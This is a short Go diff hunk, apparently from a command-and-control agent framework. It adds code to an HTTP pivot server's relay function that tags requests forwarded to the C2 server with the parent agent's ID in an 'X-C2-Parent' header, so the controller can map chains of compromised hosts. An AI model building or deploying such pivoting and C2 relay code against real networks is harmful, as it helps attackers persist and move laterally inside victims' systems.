@@ -137,6 +137,10 @@ func (ps *httpPivotServer) relay(w http.ResponseWriter, r *http.Request) {
 	if ct := r.Header.Get("Content-Type"); ct != "" {
 		upstream.Header.Set("Content-Type", ct)
 	}
+	// Inject parent agent ID so the C2 can build the pivot tree
+	if GlobalAgentID != "" {
+		upstream.Header.Set("X-C2-Parent", GlobalAgentID)
+	}
 
 	resp, err := ps.c2.Do(upstream)
 	if err != nil {
